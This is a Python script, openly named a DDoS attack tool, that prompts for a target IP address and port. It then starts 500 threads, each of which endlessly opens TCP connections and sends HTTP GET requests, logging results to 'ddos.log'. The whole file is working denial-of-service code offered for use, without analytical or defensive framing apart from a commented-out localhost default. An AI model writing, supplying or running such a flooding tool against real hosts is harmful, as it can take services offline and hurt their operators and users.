import socket
import threading
import logging
import time

# Configure logging
logging.basicConfig(filename='ddos.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# target_ip = "127.0.0.1"
# target_port = 8000

print("Enter target IP address:")
target_ip = input()
print("Enter target port:")
target_port = int(input())


def ddos_attack(thread_id):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Set timeout for socket operations
            s.connect((target_ip, target_port))
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            s.send(request.encode())
            print(f"Thread {thread_id}: Request sent successfully")
            logging.info(f"Thread {thread_id}: Request sent successfully")
        except socket.timeout:
            print(f"Thread {thread_id}: Socket timeout occurred")
            logging.error(f"Thread {thread_id}: Socket timeout occurred")
        except socket.error as e:
            print(f"Thread {thread_id}: Socket error occurred - {e}")
            logging.error(f"Thread {thread_id}: Socket error occurred - {e}")
        except Exception as e:
            print(f"Thread {thread_id}: Unexpected error occurred - {e}")
            logging.error(f"Thread {thread_id}: Unexpected error occurred - {e}")
        finally:
            s.close()
            time.sleep(1)  # Sleep for a short duration before retrying

num_threads = 500
threads = []

for i in range(num_threads):
    t = threading.Thread(target=ddos_attack, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()